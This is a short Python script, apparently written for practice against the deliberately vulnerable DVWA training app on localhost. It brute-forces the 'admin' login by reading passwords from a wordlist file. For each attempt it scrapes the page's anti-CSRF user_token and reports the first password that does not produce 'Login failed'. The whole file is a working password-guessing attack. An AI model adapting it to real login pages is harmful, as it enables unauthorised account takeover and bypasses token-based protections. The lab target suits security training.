import requests
from bs4 import BeautifulSoup

target_url = "http://localhost/DVWA/login.php"

# response = s.post(target_url, data=data_dict)
# print(response.content)


with open("/home/cuncis/Downloads/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        with requests.session() as s:
            resp1 = s.get(target_url)
            parse_html = BeautifulSoup(resp1.content, features="html.parser")
            input_value = parse_html.body.find('input', attrs={'name': 'user_token'}).get("value")
            data_dict = {"username": "admin", "password": "", "Login": "submit", "user_token": input_value}

        word = line.strip()
        data_dict["password"] = word
        response = s.post(target_url, data=data_dict)
        if "Login failed" not in str(response.content):
            print("[+] Got the password --> " + word)
            exit()
        else:
            print("word -> Incorrect Password")

print("[+] Reached and of line.")
